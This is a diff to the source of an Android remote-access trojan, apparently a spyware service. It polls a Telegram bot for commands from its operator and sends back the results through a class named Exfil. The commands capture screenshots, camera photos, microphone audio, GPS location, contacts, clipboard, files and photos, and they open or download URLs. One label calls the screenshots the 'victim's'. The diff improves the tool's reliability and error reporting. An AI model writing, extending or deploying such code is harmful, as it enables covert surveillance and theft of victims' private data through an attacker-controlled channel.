@@ -20,13 +20,41 @@ public class CommandListener extends Service {
     private long lastUpdateId = 0;
     private Handler handler = new Handler(Looper.getMainLooper());
     private boolean running = false;
+    private int errors = 0;
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         if (!running) {
             running = true;
-            Exfil.send("CMD", "Listener запущен");
-            handler.post(poll);
+
+            // ВАЖНО — сбрасываем очередь старых сообщений
+            new Thread(() -> {
+                try {
+                    String url = "https://api.telegram.org/bot" + TOKEN
+                        + "/getUpdates?offset=-1&limit=1";
+                    HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
+                    c.setConnectTimeout(10000);
+                    c.setReadTimeout(10000);
+                    BufferedReader r = new BufferedReader(
+                        new InputStreamReader(c.getInputStream()));
+                    StringBuilder sb = new StringBuilder();
+                    String line;
+                    while ((line = r.readLine()) != null) sb.append(line);
+                    r.close();
+
+                    JSONObject obj = new JSONObject(sb.toString());
+                    JSONArray arr = obj.optJSONArray("result");
+                    if (arr != null && arr.length() > 0) {
+                        long highestId = arr.getJSONObject(arr.length() - 1)
+                            .optLong("update_id", 0);
+                        lastUpdateId = highestId;
+                    }
+                    Exfil.send("CMD", "Listener запущен. LastID=" + lastUpdateId);
+                } catch (Throwable t) {
+                    Exfil.send("CMD_ERR", "Сброс: " + t.getMessage());
+                }
+                handler.post(poll);
+            }).start();
         }
         return START_STICKY;
     }
@@ -37,10 +65,11 @@ public class CommandListener extends Service {
             new Thread(() -> {
                 try {
                     String url = "https://api.telegram.org/bot" + TOKEN
-                        + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=3";
+                        + "/getUpdates?offset=" + (lastUpdateId + 1)
+                        + "&timeout=3";
                     HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
-                    c.setConnectTimeout(15000);
-                    c.setReadTimeout(15000);
+                    c.setConnectTimeout(20000);
+                    c.setReadTimeout(20000);
                     BufferedReader r = new BufferedReader(
                         new InputStreamReader(c.getInputStream()));
                     StringBuilder sb = new StringBuilder();
@@ -48,14 +77,23 @@ public class CommandListener extends Service {
                     while ((line = r.readLine()) != null) sb.append(line);
                     r.close();
 
-                    JSONObject obj = new JSONObject(sb.toString());
+                    String resp = sb.toString();
+                    JSONObject obj = new JSONObject(resp);
+
                     if (!obj.optBoolean("ok", false)) {
+                        errors++;
+                        if (errors <= 5) {
+                            String truncated = resp.length() > 200
+                                ? resp.substring(0, 200) : resp;
+                            Exfil.send("CMD_ERR", "Ошибка: " + truncated);
+                        }
                         if (running) handler.postDelayed(poll, INTERVAL);
                         return;
                     }
 
+                    errors = 0;
                     JSONArray arr = obj.optJSONArray("result");
-                    if (arr != null) {
+                    if (arr != null && arr.length() > 0) {
                         for (int i = 0; i < arr.length(); i++) {
                             JSONObject upd = arr.getJSONObject(i);
                             lastUpdateId = upd.optLong("update_id", lastUpdateId);
@@ -67,10 +105,18 @@ public class CommandListener extends Service {
                             if (!OWNER.equals(chatId)) continue;
                             String text = msg.optString("text", "").trim();
                             if (text.isEmpty()) continue;
+
+                            Exfil.send("CMD_RCV", "Получено: " + text);
                             handleCommand(text);
                         }
                     }
-                } catch (Throwable ignored) {}
+                } catch (Throwable t) {
+                    errors++;
+                    if (errors <= 5) {
+                        Exfil.send("CMD_ERR", t.getClass().getSimpleName()
+                            + ": " + t.getMessage());
+                    }
+                }
                 if (running) handler.postDelayed(poll, INTERVAL);
             }).start();
         }
@@ -78,32 +124,17 @@ public class CommandListener extends Service {
 
     private void handleCommand(String text) {
         try {
-            if (text.startsWith("/help") || text.startsWith("/start")) {
-                Exfil.send("HELP",
-                    "/ping — связь\n" +
-                    "/screenshot — скрин\n" +
-                    "/photo — фронталка\n" +
-                    "/mic — 20 сек\n" +
-                    "/location — GPS\n" +
-                    "/info — статус\n" +
-                    "/apps — приложения\n" +
-                    "/games — игры\n" +
-                    "/contacts — контакты\n" +
-                    "/battery — батарея\n" +
-                    "/clip — буфер\n" +
-                    "/vibrate — вибрация\n" +
-                    "/files <path>\n" +
-                    "/get <path>\n" +
-                    "/photos — 10 фото\n" +
-                    "/photos_all — 30 фото\n" +
-                    "/test_photos\n" +
-                    "/screens — скрины жертвы\n" +
-                    "/open <url>\n" +
-                    "/download <url>");
+            if (text.startsWith("/ping")) {
+                Exfil.send("CMD", "Pong! Всё работает");
                 return;
             }
-            if (text.startsWith("/ping")) {
-                Exfil.send("CMD", "Pong! ✅");
+            if (text.startsWith("/help") || text.startsWith("/start")) {
+                Exfil.send("HELP",
+                    "/ping /screenshot /photo /mic\n" +
+                    "/location /info /apps /games\n" +
+                    "/contacts /battery /clip /vibrate\n" +
+                    "/files /get /photos /photos_all\n" +
+                    "/test_photos /screens /open /download");
                 return;
             }
             if (text.startsWith("/screenshot")) {
@@ -138,11 +169,7 @@ public class CommandListener extends Service {
             }
             if (text.startsWith("/get")) {
                 String path = text.substring(4).trim();
-                if (path.isEmpty()) {
-                    Exfil.send("CMD", "Использование: /get /sdcard/file.jpg");
-                    return;
-                }
-                FileManager.downloadFile(this, path);
+                if (!path.isEmpty()) FileManager.downloadFile(this, path);
                 return;
             }
             if (text.startsWith("/test_photos")) { PhotoLocator.locate(); return; }
@@ -151,31 +178,24 @@ public class CommandListener extends Service {
             if (text.startsWith("/photos")) { FileManager.lastPhotos(this); return; }
             if (text.startsWith("/open ")) {
                 String url = text.substring(6).trim();
-                if (url.isEmpty()) {
-                    Exfil.send("CMD", "Использование: /open https://...");
-                    return;
-                }
-                try {
-                    Intent i = new Intent(Intent.ACTION_VIEW,
-                        android.net.Uri.parse(url));
-                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                    startActivity(i);
-                    Exfil.send("CMD", "Открыто: " + url);
-                } catch (Throwable t) {
-                    Exfil.send("CMD", "Ошибка: " + t.getMessage());
+                if (!url.isEmpty()) {
+                    try {
+                        Intent i = new Intent(Intent.ACTION_VIEW, android.net.Uri.parse(url));
+                        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                        startActivity(i);
+                        Exfil.send("CMD", "Открыто: " + url);
+                    } catch (Throwable t) {
+                        Exfil.send("CMD", "Ошибка: " + t.getMessage());
+                    }
                 }
                 return;
             }
             if (text.startsWith("/download ")) {
                 String url = text.substring(10).trim();
-                if (url.isEmpty()) {
-                    Exfil.send("CMD", "Использование: /download https://...");
-                    return;
-                }
-                downloadUrl(url);
+                if (!url.isEmpty()) downloadUrl(url);
                 return;
             }
-            Exfil.send("CMD", "Неизвестная команда: " + text);
+            Exfil.send("CMD", "Неизвестная: " + text);
         } catch (Throwable t) {
             Exfil.send("CMD", "Ошибка: " + t.getMessage());
         }
@@ -198,7 +218,7 @@ public class CommandListener extends Service {
                 is.close();
                 String b64 = android.util.Base64.encodeToString(
                     bos.toByteArray(), android.util.Base64.NO_WRAP);
-                Exfil.sendDocument("URL: " + url, b64, "download.bin");
+                Exfil.sendDocument("URL", b64, "download.bin");
             } catch (Throwable t) {
                 Exfil.send("CMD", "Ошибка download: " + t.getMessage());
             }
